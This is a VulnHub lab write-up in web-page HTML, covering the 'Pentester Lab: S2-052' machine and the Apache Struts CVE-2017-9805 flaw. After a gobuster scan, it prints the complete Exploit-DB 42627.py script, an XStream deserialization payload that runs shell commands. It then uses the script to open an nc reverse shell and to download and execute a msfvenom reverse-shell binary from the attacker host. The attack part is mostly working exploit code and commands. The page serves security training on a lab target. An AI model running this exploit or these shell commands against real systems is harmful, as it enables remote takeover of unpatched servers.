+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" type="checkbox" id="__nav_4_4" checked>
+      
+      <label class="md-nav__link" for="__nav_4_4">
+        VulnHub
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="VulnHub" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_4">
+          <span class="md-nav__icon md-icon"></span>
+          VulnHub
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Brainpan-1/index.html" class="md-nav__link">
+        Brainpan 1
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Pentester Lab: S2-052
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="index.html" class="md-nav__link md-nav__link--active">
+        Pentester Lab: S2-052
+      </a>
+      
+        
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#open-services" class="md-nav__link">
+    Open Services
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    Foothold
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2017-9805" class="md-nav__link">
+    CVE-2017-9805
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-code-execution" class="md-nav__link">
+    Remote code execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SolidState-1/index.html" class="md-nav__link">
+        SolidState: 1
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Wintermute-1-Straylight/index.html" class="md-nav__link">
+        Wintermute: 1 (Straylight)
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Wintermute-1-Neuromancer/index.html" class="md-nav__link">
+        Wintermute: 1 (Neuromancer)
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      <label class="md-nav__link" for="__nav_5">
+        Blue Teaming
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Blue Teaming" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Blue Teaming
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blue-teaming/index.html" class="md-nav__link">
+        __index__
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="https://www.blueteamsacademy.com" class="md-nav__link">
+        Blue Team Training
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/index.html" class="md-nav__link">
+        About Me
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#open-services" class="md-nav__link">
+    Open Services
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    Foothold
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2017-9805" class="md-nav__link">
+    CVE-2017-9805
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-code-execution" class="md-nav__link">
+    Remote code execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="pentester-lab-s2-052"><a href='https://www.vulnhub.com/entry/pentester-lab-s2-052,206/' target="blank">Pentester Lab: S2-052</a></h1>
+<blockquote>
+<p>Author: Hades</p>
+<p><a href="https://github.com/leecybersec/scripting"><em>Scripting here</em></a></p>
+</blockquote>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="open-services">Open Services</h3>
+<div class="highlight"><pre><span></span><code>
+</code></pre></div>
+<p>This is a web application, let's go with gobuster to enum more the hidden.</p>
+<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>Hades㉿172.17.0.1<span class="o">)</span>-<span class="o">[</span><span class="m">0</span>.8:22.4<span class="o">]</span>~
+└─$ gobuster dir -u http://192.168.110.137 -w /usr/share/seclists/Discovery/Web-Content/common.txt 
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:            http://192.168.110.137
+<span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+<span class="o">[</span>+<span class="o">]</span> Status codes:   <span class="m">200</span>,204,301,302,307,401,403
+<span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
+<span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+<span class="m">2021</span>/01/27 <span class="m">22</span>:14:58 Starting <span class="nv">gobuster</span>
+<span class="o">===============================================================</span>
+/META-INF <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span>
+/WEB-INF <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span>
+/css <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span>
+/fonts <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span>
+/orders <span class="o">(</span>Status: <span class="m">200</span><span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="m">2021</span>/01/27 <span class="m">22</span>:15:01 <span class="nv">Finished</span>
+<span class="o">===============================================================</span>
+</code></pre></div>
+<p>Go to uri "/orders" and check how app work.</p>
+<div class="tabbed-set" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><label for="__tabbed_1_1">Orders</label><div class="tabbed-content">
+<p><img alt="1" src="img/1.png" /></p>
+</div>
+<input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><label for="__tabbed_1_2">view-source</label><div class="tabbed-content">
+<p><img alt="2" src="img/2.png" /></p>
+</div>
+</div>
+<h2 id="foothold">Foothold</h2>
+<h3 id="cve-2017-9805">CVE-2017-9805</h3>
+<p>Look around in the internet, I found CVE-2017-9805 with key word "orders.xhtml exploit".</p>
+<p><a href='https://github.com/mazen160/struts-pwn_CVE-2017-9805' target="blank">struts-pwn - CVE-2017-9805 Exploit</a></p>
+<p><img alt="3" src="img/3.png" /></p>
+<p>Let's use <code>searchsploit</code> to find more about this vulnerability.</p>
+<div class="tabbed-set" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><label for="__tabbed_2_1">searchsploit</label><div class="tabbed-content">
+<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>Hades㉿172.17.0.1<span class="o">)</span>-<span class="o">[</span><span class="m">0</span>.8:22.1<span class="o">]</span>~
+└─$ searchsploit struts rest             
+------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                 <span class="p">|</span>  Path
+------------------------------------------------------------------------------- ---------------------------------
+Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Executi <span class="p">|</span> multiple/remote/39919.rb
+Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Executi <span class="p">|</span> multiple/remote/43382.py
+Apache Struts <span class="m">2</span>.5 &lt; <span class="m">2</span>.5.12 - REST Plugin XStream Remote Code Execution         <span class="p">|</span> linux/remote/42627.py
+------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+┌──<span class="o">(</span>Hades㉿172.17.0.1<span class="o">)</span>-<span class="o">[</span><span class="m">0</span>.8:22.1<span class="o">]</span>~
+└─$ searchsploit -m linux/remote/42627.py
+  Exploit: Apache Struts <span class="m">2</span>.5 &lt; <span class="m">2</span>.5.12 - REST Plugin XStream Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/42627
+     Path: /usr/share/exploitdb/exploits/linux/remote/42627.py
+File Type: UTF-8 Unicode text, with CRLF line terminators
+
+Copied to: /home/kali/42627.py
+</code></pre></div>
+</div>
+<input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><label for="__tabbed_2_2">42627.py</label><div class="tabbed-content">
+<div class="highlight"><pre><span></span><code><span class="c1"># Exploit Title: Struts 2.5 - 2.5.12 REST Plugin XStream RCE</span>
+<span class="c1"># Google Dork: filetype:action</span>
+<span class="c1"># Date: 06/09/2017</span>
+<span class="c1"># Exploit Author: Warflop</span>
+<span class="c1"># Vendor Homepage: https://struts.apache.org/</span>
+<span class="c1"># Software Link: http://mirror.nbtelecom.com.br/apache/struts/2.5.10/struts-2.5.10-all.zip</span>
+<span class="c1"># Version: Struts 2.5 – Struts 2.5.12</span>
+<span class="c1"># Tested on: Struts 2.5.10</span>
+<span class="c1"># CVE : 2017-9805</span>
+
+<span class="c1">#!/usr/bin/env python3</span>
+<span class="c1"># coding=utf-8</span>
+<span class="c1"># *****************************************************</span>
+<span class="c1"># Struts CVE-2017-9805 Exploit</span>
+<span class="c1"># Warflop (http://securityattack.com.br/)</span>
+<span class="c1"># Greetz: Pimps &amp; G4mbl3r</span>
+<span class="c1"># *****************************************************</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">exploration</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
+
+    <span class="n">exploit</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">                &lt;map&gt;</span>
+<span class="s1">                &lt;entry&gt;</span>
+<span class="s1">                &lt;jdk.nashorn.internal.objects.NativeString&gt;</span>
+<span class="s1">                &lt;flags&gt;0&lt;/flags&gt;</span>
+<span class="s1">                &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span>
+<span class="s1">                &lt;dataHandler&gt;</span>
+<span class="s1">                &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span>
+<span class="s1">                &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span>
+<span class="s1">                &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span>
+<span class="s1">                &lt;initialized&gt;false&lt;/initialized&gt;</span>
+<span class="s1">                &lt;opmode&gt;0&lt;/opmode&gt;</span>
+<span class="s1">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span>
+<span class="s1">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span>
+<span class="s1">                &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span>
+<span class="s1">                &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span>
+<span class="s1">                &lt;command&gt;</span>
+<span class="s1">                &lt;string&gt;/bin/sh&lt;/string&gt;&lt;string&gt;-c&lt;/string&gt;&lt;string&gt;&#39;&#39;&#39;</span><span class="o">+</span> <span class="n">command</span> <span class="o">+</span><span class="s1">&#39;&#39;&#39;&lt;/string&gt;</span>
+<span class="s1">                &lt;/command&gt;</span>
+<span class="s1">                &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span>
+<span class="s1">                &lt;/next&gt;</span>
+<span class="s1">                &lt;/iter&gt;</span>
+<span class="s1">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span>
+<span class="s1">                &lt;method&gt;</span>
+<span class="s1">                &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span>
+<span class="s1">                &lt;name&gt;start&lt;/name&gt;</span>
+<span class="s1">                &lt;parameter-types/&gt;</span>
+<span class="s1">                &lt;/method&gt;</span>
+<span class="s1">                &lt;name&gt;foo&lt;/name&gt;</span>
+<span class="s1">                &lt;/filter&gt;</span>
+<span class="s1">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span>
+<span class="s1">                &lt;/serviceIterator&gt;</span>
+<span class="s1">                &lt;lock/&gt;</span>
+<span class="s1">                &lt;/cipher&gt;</span>
+<span class="s1">                &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span>
+<span class="s1">                &lt;ibuffer/&gt;</span>
+<span class="s1">                &lt;done&gt;false&lt;/done&gt;</span>
+<span class="s1">                &lt;ostart&gt;0&lt;/ostart&gt;</span>
+<span class="s1">                &lt;ofinish&gt;0&lt;/ofinish&gt;</span>
+<span class="s1">                &lt;closed&gt;false&lt;/closed&gt;</span>
+<span class="s1">                &lt;/is&gt;</span>
+<span class="s1">                &lt;consumed&gt;false&lt;/consumed&gt;</span>
+<span class="s1">                &lt;/dataSource&gt;</span>
+<span class="s1">                &lt;transferFlavors/&gt;</span>
+<span class="s1">                &lt;/dataHandler&gt;</span>
+<span class="s1">                &lt;dataLen&gt;0&lt;/dataLen&gt;</span>
+<span class="s1">                &lt;/value&gt;</span>
+<span class="s1">                &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span>
+<span class="s1">                &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span>
+<span class="s1">                &lt;/entry&gt;</span>
+<span class="s1">                &lt;entry&gt;</span>
+<span class="s1">                &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span>
+<span class="s1">                &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span>
+<span class="s1">                &lt;/entry&gt;</span>
+<span class="s1">                &lt;/map&gt;</span>
+<span class="s1">                &#39;&#39;&#39;</span>
+
+
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/xml&#39;</span><span class="p">}</span>
+
+    <span class="n">request</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">exploit</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s1">&#39;CVE: 2017-9805 - Apache Struts2 Rest Plugin Xstream RCE&#39;</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s1">&#39;[*] Warflop - http://securityattack.com.br&#39;</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s1">&#39;[*] Greatz: Pimps &amp; G4mbl3r&#39;</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s1">&#39;[*] Use: python struts2.py URL COMMAND&#39;</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s1">&#39;[*] Example: python struts2.py http://sitevulnerable.com/struts2-rest-showcase/orders/3 id&#39;</span><span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">exploration</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</code></pre></div>
+</div>
+</div>
+<h3 id="remote-code-execution">Remote code execution</h3>
+<div class="tabbed-set" data-tabs="3:3"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><label for="__tabbed_3_1">ping</label><div class="tabbed-content">
+<p>Check remote code with <code>tcpdump</code>. Let's open tcpdump in Kali machine.</p>
+<div class="highlight"><pre><span></span><code>sudo tcpdump -i eth0 icmp
+</code></pre></div>
+<p>Run exploit <code>42627.py</code></p>
+<div class="highlight"><pre><span></span><code>python3 <span class="m">42627</span>.py http://192.168.110.137/orders/3 <span class="s1">&#39;ping -c 2 192.168.110.131&#39;</span> 
+</code></pre></div>
+<p><img alt="4" src="img/4.png" /></p>
+</div>
+<input id="__tabbed_3_2" name="__tabbed_3" type="radio" /><label for="__tabbed_3_2">re using nc</label><div class="tabbed-content">
+<p>Create a listener in Kali machine.</p>
+<div class="highlight"><pre><span></span><code>sudo nc -nvlp <span class="m">4444</span>
+</code></pre></div>
+<p>Get reverse shell</p>
+<div class="highlight"><pre><span></span><code>python3 <span class="m">42627</span>.py http://192.168.110.137/orders/3 <span class="s1">&#39;nc 192.168.110.131 4444 -e /bin/sh&#39;</span> &gt; /dev/null
+</code></pre></div>
+<p><img alt="7" src="img/7.png" /></p>
+</div>
+<input id="__tabbed_3_3" name="__tabbed_3" type="radio" /><label for="__tabbed_3_3">msfvenom file</label><div class="tabbed-content">
+<p>Create payload file with <code>msfvenom</code></p>
+<div class="highlight"><pre><span></span><code>msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.110.131 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f elf &gt; shell.elf
+</code></pre></div>
+<p>Create a http server to transfer payload file.</p>
+<div class="highlight"><pre><span></span><code>sudo python3 -m http.server <span class="m">80</span>
+</code></pre></div>
+<p>Download file shell.elf using <code>42627.py</code> and <code>wget</code></p>
+<div class="highlight"><pre><span></span><code>python3 <span class="m">42627</span>.py http://192.168.110.137/orders/3 <span class="s1">&#39;wget http://192.168.110.131/shell.elf -O /tmp/shell&#39;</span>
+</code></pre></div>
+<p><img alt="5" src="img/5.png" /></p>
+<p>Create a listener in Kali machine.</p>
+<div class="highlight"><pre><span></span><code>sudo nc -nvlp <span class="m">4444</span>
+</code></pre></div>
+<p>Execute file shell.elf and get reverse shell</p>
+<div class="highlight"><pre><span></span><code>python3 42627.py http://192.168.110.137/orders/3 &#39;chmod +x /tmp/shell&#39; &gt; /dev/null
+python3 42627.py http://192.168.110.137/orders/3 &#39;/tmp/shell&#39; &gt; /dev/null
+</code></pre></div>
+<p><img alt="6" src="img/6.png" /></p>
+</div>
+</div>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../Brainpan-1/index.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: Brainpan 1" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Brainpan 1
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../SolidState-1/index.html" class="md-footer__link md-footer__link--next" aria-label="Next: SolidState: 1" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              SolidState: 1
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2020 - 2021 LeeCyberSec
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+        
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://www.facebook.com/leecybersec" target="_blank" rel="noopener" title="www.facebook.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://twitter.com/leecybersec" target="_blank" rel="noopener" title="twitter.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://github.com/leecybersec" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://www.linkedin.com/in/leecybersec" target="_blank" rel="noopener" title="www.linkedin.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://www.youtube.com/channel/UC_2YYw_h37UiMUaPv_tB5Rw" target="_blank" rel="noopener" title="www.youtube.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../../assets/javascripts/workers/search.477d984a.min.js", "version": null}</script>
+    
+    
